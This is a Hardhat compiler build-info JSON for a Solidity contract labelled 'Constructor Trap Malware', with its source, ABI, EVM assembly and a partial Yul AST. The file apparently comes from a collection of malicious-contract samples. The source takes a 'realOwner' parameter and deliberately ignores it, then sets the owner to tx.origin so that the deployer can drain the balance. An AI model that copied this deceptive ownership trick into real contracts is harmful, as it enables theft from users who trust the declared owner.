{
	"id": "5bf7b479055ff9515c71edb147efaf50",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.29",
	"solcLongVersion": "0.8.29+commit.ab55807c",
	"input": {
		"language": "Solidity",
		"sources": {
			"M/Constructor Trap Malware.sol": {
				"content": "contract ConstructorTrap {\n    address public owner;\n\n    constructor(address realOwner) {\n        // Pretend to be setting owner\n        realOwner; // looks like it's used\n        owner = tx.origin; // trap!\n    }\n\n    function drain() external {\n        require(msg.sender == owner, \"Not owner\");\n        payable(owner).transfer(address(this).balance);\n    }\n\n    receive() external payable {}\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"M/Constructor Trap Malware.sol": {
				"ConstructorTrap": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "realOwner",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "drain",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"M/Constructor Trap Malware.sol\":0:397  contract ConstructorTrap {... */\n  mstore(0x40, 0x80)\n    /* \"M/Constructor Trap Malware.sol\":58:214  constructor(address realOwner) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"M/Constructor Trap Malware.sol\":189:198  tx.origin */\n  origin\n    /* \"M/Constructor Trap Malware.sol\":181:186  owner */\n  0x00\n  0x00\n    /* \"M/Constructor Trap Malware.sol\":181:198  owner = tx.origin */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"M/Constructor Trap Malware.sol\":58:214  constructor(address realOwner) {... */\n  pop\n    /* \"M/Constructor Trap Malware.sol\":0:397  contract ConstructorTrap {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"M/Constructor Trap Malware.sol\":0:397  contract ConstructorTrap {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"M/Constructor Trap Malware.sol\":0:397  contract ConstructorTrap {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9890220b\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"M/Constructor Trap Malware.sol\":31:51  address public owner */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_7\n      jumpi\n      revert(0x00, 0x00)\n    tag_7:\n      pop\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"M/Constructor Trap Malware.sol\":220:360  function drain() external {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      revert(0x00, 0x00)\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      stop\n        /* \"M/Constructor Trap Malware.sol\":31:51  address public owner */\n    tag_9:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"M/Constructor Trap Malware.sol\":220:360  function drain() external {... */\n    tag_14:\n        /* \"M/Constructor Trap Malware.sol\":278:283  owner */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Constructor Trap Malware.sol\":264:283  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Constructor Trap Malware.sol\":264:274  msg.sender */\n      caller\n        /* \"M/Constructor Trap Malware.sol\":264:283  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"M/Constructor Trap Malware.sol\":256:297  require(msg.sender == owner, \"Not owner\") */\n      tag_16\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_17\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_16:\n        /* \"M/Constructor Trap Malware.sol\":315:320  owner */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Constructor Trap Malware.sol\":307:330  payable(owner).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Constructor Trap Malware.sol\":307:353  payable(owner).transfer(address(this).balance) */\n      0x08fc\n        /* \"M/Constructor Trap Malware.sol\":331:352  address(this).balance */\n      selfbalance\n        /* \"M/Constructor Trap Malware.sol\":307:353  payable(owner).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n        /* \"M/Constructor Trap Malware.sol\":220:360  function drain() external {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_21:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_22:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_30\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_21\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_23:\n        /* \"#utility.yul\":328:352   */\n      tag_32\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_22\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_11:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_34\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_23\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:762   */\n    tag_24:\n        /* \"#utility.yul\":677:688   */\n      0x00\n        /* \"#utility.yul\":711:717   */\n      dup3\n        /* \"#utility.yul\":706:709   */\n      dup3\n        /* \"#utility.yul\":699:718   */\n      mstore\n        /* \"#utility.yul\":751:755   */\n      0x20\n        /* \"#utility.yul\":746:749   */\n      dup3\n        /* \"#utility.yul\":742:756   */\n      add\n        /* \"#utility.yul\":727:756   */\n      swap1\n      pop\n        /* \"#utility.yul\":593:762   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":768:927   */\n    tag_25:\n        /* \"#utility.yul\":908:919   */\n      0x4e6f74206f776e65720000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":904:905   */\n      0x00\n        /* \"#utility.yul\":896:902   */\n      dup3\n        /* \"#utility.yul\":892:906   */\n      add\n        /* \"#utility.yul\":885:920   */\n      mstore\n        /* \"#utility.yul\":768:927   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":933:1298   */\n    tag_26:\n        /* \"#utility.yul\":1075:1078   */\n      0x00\n        /* \"#utility.yul\":1096:1162   */\n      tag_38\n        /* \"#utility.yul\":1160:1161   */\n      0x09\n        /* \"#utility.yul\":1155:1158   */\n      dup4\n        /* \"#utility.yul\":1096:1162   */\n      tag_24\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":1089:1162   */\n      swap2\n      pop\n        /* \"#utility.yul\":1171:1264   */\n      tag_39\n        /* \"#utility.yul\":1260:1263   */\n      dup3\n        /* \"#utility.yul\":1171:1264   */\n      tag_25\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":1289:1291   */\n      0x20\n        /* \"#utility.yul\":1284:1287   */\n      dup3\n        /* \"#utility.yul\":1280:1292   */\n      add\n        /* \"#utility.yul\":1273:1292   */\n      swap1\n      pop\n        /* \"#utility.yul\":933:1298   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1304:1723   */\n    tag_18:\n        /* \"#utility.yul\":1470:1474   */\n      0x00\n        /* \"#utility.yul\":1508:1510   */\n      0x20\n        /* \"#utility.yul\":1497:1506   */\n      dup3\n        /* \"#utility.yul\":1493:1511   */\n      add\n        /* \"#utility.yul\":1485:1511   */\n      swap1\n      pop\n        /* \"#utility.yul\":1557:1566   */\n      dup2\n        /* \"#utility.yul\":1551:1555   */\n      dup2\n        /* \"#utility.yul\":1547:1567   */\n      sub\n        /* \"#utility.yul\":1543:1544   */\n      0x00\n        /* \"#utility.yul\":1532:1541   */\n      dup4\n        /* \"#utility.yul\":1528:1545   */\n      add\n        /* \"#utility.yul\":1521:1568   */\n      mstore\n        /* \"#utility.yul\":1585:1716   */\n      tag_41\n        /* \"#utility.yul\":1711:1715   */\n      dup2\n        /* \"#utility.yul\":1585:1716   */\n      tag_26\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":1577:1716   */\n      swap1\n      pop\n        /* \"#utility.yul\":1304:1723   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212200bcd705f5e39d431af854077a13b6884957db480ab8cd6ca4f464d92fb26577d64736f6c634300081d0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_15": {
									"entryPoint": null,
									"id": 15,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 192,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 212,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 153,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 122,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 118,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 170,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:1199:1",
										"nodeType": "YulBlock",
										"src": "0:1199:1",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:1",
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nativeSrc": "57:19:1",
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:1",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nativeSrc": "67:9:1",
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:1",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:1",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nativeSrc": "177:28:1",
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:1",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:1",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nativeSrc": "187:12:1",
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nativeSrc": "187:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nativeSrc": "300:28:1",
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:1",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:1",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nativeSrc": "310:12:1",
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nativeSrc": "310:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nativeSrc": "379:81:1",
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nativeSrc": "389:65:1",
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:1",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nativeSrc": "400:54:1",
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:1",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:1",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nativeSrc": "511:51:1",
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nativeSrc": "521:35:1",
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:1",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nativeSrc": "532:24:1",
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:1",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:1",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nativeSrc": "611:79:1",
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:1",
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:1",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:1",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nativeSrc": "670:12:1",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nativeSrc": "670:12:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:1",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:1",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nativeSrc": "641:24:1",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:1",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nativeSrc": "631:35:1",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nativeSrc": "624:43:1",
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nativeSrc": "621:63:1",
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:1",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nativeSrc": "759:80:1",
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nativeSrc": "769:22:1",
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "784:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "778:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nativeSrc": "778:13:1",
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "769:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "827:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "800:26:1",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nativeSrc": "800:33:1",
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nativeSrc": "800:33:1",
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nativeSrc": "696:143:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "737:6:1",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "745:3:1",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "753:5:1",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nativeSrc": "922:274:1",
													"nodeType": "YulBlock",
													"src": "922:274:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "968:83:1",
																"nodeType": "YulBlock",
																"src": "968:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "970:77:1",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:1"
																			},
																			"nativeSrc": "970:79:1",
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:1"
																		},
																		"nativeSrc": "970:79:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "943:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "952:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "939:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:1"
																		},
																		"nativeSrc": "939:23:1",
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "964:2:1",
																		"nodeType": "YulLiteral",
																		"src": "964:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "935:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:1"
																},
																"nativeSrc": "935:32:1",
																"nodeType": "YulFunctionCall",
																"src": "935:32:1"
															},
															"nativeSrc": "932:119:1",
															"nodeType": "YulIf",
															"src": "932:119:1"
														},
														{
															"nativeSrc": "1061:128:1",
															"nodeType": "YulBlock",
															"src": "1061:128:1",
															"statements": [
																{
																	"nativeSrc": "1076:15:1",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:1",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1090:1:1",
																		"nodeType": "YulLiteral",
